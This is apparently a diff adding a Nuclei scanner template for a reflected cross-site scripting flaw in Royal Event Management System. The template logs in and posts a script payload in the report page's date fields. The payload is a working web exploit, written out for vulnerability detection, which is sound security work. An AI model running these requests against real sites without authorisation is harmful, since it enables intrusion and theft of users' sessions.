@@ -1,0 +1,76 @@
+id: royalevent-management-xss
+
+info:
+  name: Royal Event Management System - Cross-Site Scripting
+  author: ritikchaddha
+  severity: high
+  description: |
+    Royal Event Management System contains a cross-site scripting vulnerability. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
+  reference:
+    - https://www.sourcecodester.com/sites/default/files/download/oretnom23/Royal%20Event.zip
+    - https://packetstormsecurity.com/files/166479/Royale-Event-Management-System-1.0-Cross-Site-Scripting.html
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
+    cvss-score: 7.2
+    cwe-id: CWE-79
+  metadata:
+    verified: true
+    max-request: 2
+  tags: cms,royalevent,packetstorm,xss,authenticated,intrusive
+
+http:
+  - raw:
+      - |
+        POST /royal_event/ HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 353
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryCSxQll1eihcqgIgD
+
+        ------WebKitFormBoundaryCSxQll1eihcqgIgD
+        Content-Disposition: form-data; name="username"
+
+        {{username}}
+        ------WebKitFormBoundaryCSxQll1eihcqgIgD
+        Content-Disposition: form-data; name="password"
+
+        {{password}}
+        ------WebKitFormBoundaryCSxQll1eihcqgIgD
+        Content-Disposition: form-data; name="login"
+
+        ------WebKitFormBoundaryCSxQll1eihcqgIgD--
+      - |
+        POST /royal_event/btndates_report.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFboH5ITu7DsGIGrD
+
+        ------WebKitFormBoundaryFboH5ITu7DsGIGrD
+        Content-Disposition: form-data; name="todate"
+
+        2022-12-22<script>alert(document.domain)</script>
+        ------WebKitFormBoundaryFboH5ITu7DsGIGrD
+        Content-Disposition: form-data; name="search"
+
+        3
+        ------WebKitFormBoundaryFboH5ITu7DsGIGrD
+        Content-Disposition: form-data; name="fromdate"
+
+        2022-06-22<script>alert(document.domain)</script>
+        ------WebKitFormBoundaryFboH5ITu7DsGIGrD--
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "<script>alert(document.domain)</script>"
+          - "Report from "
+        condition: and
+
+      - type: word
+        part: header
+        words:
+          - text/html
+
+      - type: status
+        status:
+          - 200
+# digest: 4a0a00473045022100ace6ec60e88c58fd79ba10ee855e56475b3e9002e669219ec6e30a9ce4be8242022017306dbd2e366545a2a90e5a18f5d932f9e869f7095d388632fce6ac98e4732e:922c64590222798bb761d5b6d8e72950
